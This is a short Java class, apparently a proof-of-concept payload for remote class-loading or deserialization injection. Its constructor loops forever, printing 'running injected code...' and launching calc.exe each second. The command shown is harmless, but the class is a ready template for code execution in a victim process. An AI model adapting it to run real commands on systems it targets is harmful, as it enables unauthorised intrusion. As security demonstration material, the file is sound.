public class ExportObject {
    public ExportObject() {
        try {
            while(true) {
                System.out.println("running injected code...");
                Runtime.getRuntime().exec("calc.exe");
                Thread.sleep( 1000 );

            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

}